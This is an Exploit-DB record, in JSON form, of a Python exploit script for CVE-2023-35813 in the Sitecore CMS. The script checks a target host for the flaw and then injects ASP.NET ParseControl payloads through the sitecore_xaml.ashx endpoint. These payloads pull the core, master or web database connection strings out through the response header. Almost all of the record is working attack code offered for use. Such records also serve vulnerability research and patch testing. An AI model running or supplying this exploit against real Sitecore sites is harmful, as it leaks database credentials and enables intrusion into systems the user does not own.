{"source": "https://www.exploit-db.com/exploits/51876", "vulnName": "Sitecore - Remote Code Execution v8.2", "vulnEDBID": "51876", "vulnCVE": "N/A", "author": "ABHISHEK MORLA", "exploitType": "WEBAPPS", "platform": "ASPX", "datePublished": "2024-03-11", "vulnContent": "#!/usr/bin/env python3\n#\n# Exploit Title: Sitecore - Remote Code Execution v8.2 \n# Exploit Author: abhishek morla\n# Google Dork: N/A\n# Date: 2024-01-08\n# Vendor Homepage: https://www.sitecore.com/\n# Software Link: https://dev.sitecore.net/\n# Version: 10.3\n# Tested on: windows64bit / mozila firefox \n# CVE : CVE-2023-35813\n# The vulnerability impacts all Experience Platform topologies (XM, XP, XC) from 9.0 Initial Release to 10.3 Initial Release; 8.2 is also impacted\n# Blog : https://medium.com/@abhishekmorla/uncovering-cve-2023-35813-retrieving-core-connection-strings-in-sitecore-5502148fce09\n# Video POC : https://youtu.be/vWKl9wgdTB0\n\nimport argparse\nimport requests\nfrom urllib.parse import quote\nfrom rich.console import Console\n\nconsole = Console()\ndef initial_test(hostname):\n    # Initial payload to test vulnerability\n    test_payload = '''\n    <%@Register\n        TagPrefix = 'x'\n        Namespace = 'System.Runtime.Remoting.Services'\n        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'\n    %>\n    <x:RemotingService runat='server'\n    Context-Response-ContentType='TestVulnerability'\n    />\n    '''\n    encoded_payload = quote(test_payload)\n\n    url = f\"https://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index\"\n    headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n    data = \"__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\\\"{}\\\")\".format(encoded_payload)\n\n    response = requests.post(url, headers=headers, data=data, verify=False)\n\n    # Check for the test string in the Content-Type of the response\n    return 'TestVulnerability' in response.headers.get('Content-Type', '')\n\ndef get_payload(choice):\n    # Payload templates for different options\n    payloads = {\n        '1': \"<%$ ConnectionStrings:core %>\",\n        '2': \"<%$ ConnectionStrings:master %>\",\n        '3': \"<%$ ConnectionStrings:web %>\"\n    }\n\n    base_payload = '''\n    <%@Register\n        TagPrefix = 'x'\n        Namespace = 'System.Runtime.Remoting.Services'\n        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'\n    %>\n    <x:RemotingService runat='server'\n    Context-Response-ContentType='{}'\n    />\n    '''\n\n    return base_payload.format(payloads.get(choice, \"Invalid\"))\n\ndef main(hostname):\n    if initial_test(hostname):\n        print(\"Exploiting, Please wait...\")\n        console.print(\"[bold green]The target appears to be vulnerable. Proceed with payload selection.[/bold green]\")\n        print(\"Select the payload to use:\")\n        print(\"1: Core connection strings\")\n        print(\"2: Master connection strings\")\n        print(\"3: Web connection strings\")\n        payload_choice = input(\"Enter your choice (1, 2, or 3): \")\n\n        payload = get_payload(payload_choice)\n        encoded_payload = quote(payload)\n\n        url = f\"http://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index\"\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        data = \"__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\\\"{}\\\")\".format(encoded_payload)\n\n        response = requests.post(url, headers=headers, data=data)\n\n        if 'Content-Type' in response.headers:\n            print(\"Content-Type from the response header:\")\n            print(\"\\n\")\n            print(response.headers['Content-Type'])\n        else:\n            print(\"No Content-Type in the response header. Status Code:\", response.status_code)\n    else:\n        print(\"The target does not appear to be vulnerable to CVE-2023-35813.\")\n\n\nif __name__ == \"__main__\":\n    console.print(\"[bold green]Author: Abhishek Morla[/bold green]\")\n    console.print(\"[bold red]CVE-2023-35813[/bold red]\")\n    parser = argparse.ArgumentParser(description='Test for CVE-2023-35813 vulnerability in Sitecore')\n    parser.add_argument('hostname', type=str, help='Hostname of the target Sitecore instance')\n    args = parser.parse_args()\n\n    main(args.hostname)\n            "}